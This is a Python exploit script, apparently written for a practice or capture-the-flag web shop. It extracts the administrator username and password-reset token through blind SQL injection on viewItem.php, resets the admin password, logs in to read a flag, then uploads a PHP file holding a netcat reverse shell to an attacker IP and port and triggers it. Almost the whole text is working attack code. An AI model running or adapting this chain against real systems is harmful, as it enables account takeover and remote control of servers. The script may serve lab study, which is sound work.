import requests
import argparse
import sys
import re

s = requests.session()
http_proxy = 'http://127.0.0.1:8080'
proxyDict = {
            "http" : http_proxy,
            "https" : http_proxy
}

def request_token(target, username):
    print("\n[+] Requesting password reset token...")
    burp0_url = "http://%s/login/resetPassword.php" %target
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.163.143", "Connection": "close", "Referer": "http://192.168.163.143/login/resetPassword.php", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": "%s" %username}
    res = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxyDict)
    if "Success" in res.text:
        print("[*] Passsword reset token request succeeded")
    else:
        print("[-] Password reset token request failed :-(")
        sys.exit(-1)

def viewitems_sqli(target, inj_str):
    for j in range (32, 126):

        burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        url = 'http://%s/item/viewItem.php?id=%s' %(target, inj_str.replace("[CHAR]", str(j)))
        s = requests.session()
        res = s.get(url, proxies=proxyDict, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
        if res.status_code == 404:
            return j
    return None

def inject(r, target, sqli):
    extracted = ""

    for i in range(1, r):
        inj_str = '1+AND+ascii(substring((select+%s+from+user+WHERE+id_level+=1+LIMIT+1),'%sqli +str(i)+',1))+=[CHAR]'
        retrieved_value = viewitems_sqli(target, inj_str)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    return extracted

def change_password(target, token, password):

    print("\n[+] Using token to change password...")
    burp0_url = "http://%s/login/doResetPassword.php?token=%s"%(target, token)
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    res = s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, proxies=proxyDict)
    if 'Success' in res.text:
        print("[*] Valid token supplied. Reseting password..")
    else:
        sys.exit(-1)
    burp0_url = "http://%s/login/doChangePassword.php" %target
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://%s" %target, "Connection": "close", "Referer": "http://%s/login/doResetPassword.php?token=%s" %(target, token), "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"token": "%s" %token, "password": "%s" %password}
    s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxyDict)

def login(target, username, password):

    print("[+] Logging in with new credentials "+username+"/"+password+"...")
    burp0_url = "http://%s/login/checkLogin.php" %target
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://%s" %target, "Connection": "close", "Referer": "http://%s/login/login.php" %target, "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": "%s" %username, "password": "%s" %password}
    res = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxyDict)
    flag = re.findall(r'\w+:\s\w+',res.text)
    print("[*] "+flag[0])

def rvsh(target, ip, port):

    print("[+] Uploading reverse shell to target...")
    burp0_url = "http://%s/item/updateItem.php" %target
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------323420095911071232074181145817", "Origin": "http://%s" %target, "Connection": "close", "Referer": "http://%s/item/editItem.php?id=1" %target, "Upgrade-Insecure-Requests": "1"}
    burp0_data = "-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"id_user\"\r\n\r\n1\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nRaspery Pi 4\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"image\"; filename=\"test.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f'); ?>\n\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\nLatest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B\r\n-----------------------------323420095911071232074181145817\r\nContent-Disposition: form-data; name=\"price\"\r\n\r\n92\r\n-----------------------------323420095911071232074181145817--\r\n" %(ip, port)
    s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxyDict)
    print("[+] Initating reverse shell. Check NetCat listener....")
    burp0_url = "http://%s/item/image/test.phar" %target
    burp0_cookies = {"PHPSESSID": "8u8hdaub5bnv8n6g2qkhudn8u6"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://%s/item/editItem.php?id=1" %target, "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, proxies=proxyDict)

if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Target URL', required=True)
    parser.add_argument('-p','--password', help='Password to set', required=True)
    parser.add_argument('-i','--ip', help='Attacker IP', required=True)
    parser.add_argument('-pt','--port', help='Attacker Port', required=True)
    args = parser.parse_args()

    target = args.target
    password = args.password
    ip = args.ip
    port = args.port
    print("[+] Extrcting administrator Username via SQL Injection...")
    username = inject(10, target, 'username')
    request_token(target, username)
    print("[+] Extracting token for "+username+" via SQL Injection...")
    token = inject(16, target, 'token')
    change_password(target, token, password)
    login(target, username, password)
    rvsh(target, ip, port)
